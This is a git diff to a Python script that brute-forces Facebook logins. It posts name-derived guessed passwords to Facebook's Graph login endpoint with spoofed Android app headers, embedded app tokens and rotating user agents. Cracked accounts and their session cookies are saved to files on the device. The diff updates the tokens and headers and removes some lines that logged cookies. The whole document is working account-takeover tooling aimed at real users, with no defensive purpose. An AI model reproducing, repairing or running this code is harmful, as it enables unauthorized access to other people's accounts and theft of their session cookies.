@@ -112,7 +112,7 @@ def Hxw_Main():
         file()
     if inpp == '2':pak()
     if inpp =='3':
-        gmail()
+        soon()
     if inpp == "4":
      print(f'{oo("+")}Loading Best File Create Command ')
      os.system('cd && git clone --depth=1 https://github.com/Hannan-404/FILE')
@@ -237,6 +237,7 @@ Mozilla/5.0 (Linux; Android 12; 22041216C Build/SP1A.210812.016; wv) AppleWebKit
 Mozilla/5.0 (Linux; Android 10; CDY-NX9B Build/HUAWEICDY-N29B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.0.0.0.302;]
 Mozilla/5.0 (Linux; Android 10; STS570 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/389.1.0.23.214;]
 Mozilla/5.0 (Linux; Android 11; TECNO KG6p Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0;]
 
 """
 ####@-----FileM-----@####
@@ -290,7 +291,9 @@ def method():
         sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:              
-            heads = None
+          #  heads = None
+            heads= "Dalvik/2.1.0 (Linux; U; Android 12.0.0; SM-G935U Build/hero2qlteue [FBAN/FB4A;FBAV/325.0.0.9214;FBBV/260762259;FBDM/{density=1.0,width=720,height=1280};FBLC/en_US;FBRV/260762259;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.mlite;FBDV/SM-G935U;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi"
+            
             header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
@@ -300,9 +303,6 @@ def method():
             if 'session_key' in response.text:
                 okacc.append(acc)
                 print('\r\033[1;92m[\033[1;97mHANNAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
-                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                print("\r\r\033[1;33m Cookie: "+coki)
-                open('/sdcard/MUGHAL-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                 open('/sdcard/Hannan-OK.txt','a').write(f'{acc} • {pword}\n')
                 if c=='y':
                     try:
@@ -362,8 +362,7 @@ def method():
                   ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                   cookies = f"sb={ssbb};{ckkk}"
                  except Exception as e:print(str(e)+' | '+response.text)
-                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies) 
-                 open('/sdcard/MUGHAL-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                  break
             elif 'checkpoint' in response.text:
                 if cpok=='n':
@@ -441,13 +440,13 @@ def andom():
         sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:              
-            heads = None
+            heads = random.choice(ua)
             header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
-            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"6737875149573085|0iko_UzWPzEE_bXuDJffiK2Ql8Y","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "7110a76c1f8ee419b8c690fc4956892a"}
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
-      #      print(response.text)
+            print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
                 print('\r\033[1;92m[\033[1;97mHANNAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
@@ -458,8 +457,6 @@ def andom():
                            ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                            ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                            cookies = f"sb={ssbb};{ckkk}"
-                           coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                           open('/sdcard/MUGHAL-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                     except Exception as e:print(str(e)+' | '+response.text)
                 break
             elif 'www.facebook.com' in response.text:
@@ -494,7 +491,7 @@ def andom():
         sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:
-            heads = None
+            heads = ua
             header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
@@ -513,8 +510,7 @@ def andom():
                   ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                   cookies = f"sb={ssbb};{ckkk}"
                  except Exception as e:print(str(e)+' | '+response.text)
-                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)   
-                 open('/sdcard/MUGHAL-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')             
+                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                  break
             elif 'checkpoint' in response.text:
                 if cpok=='n':
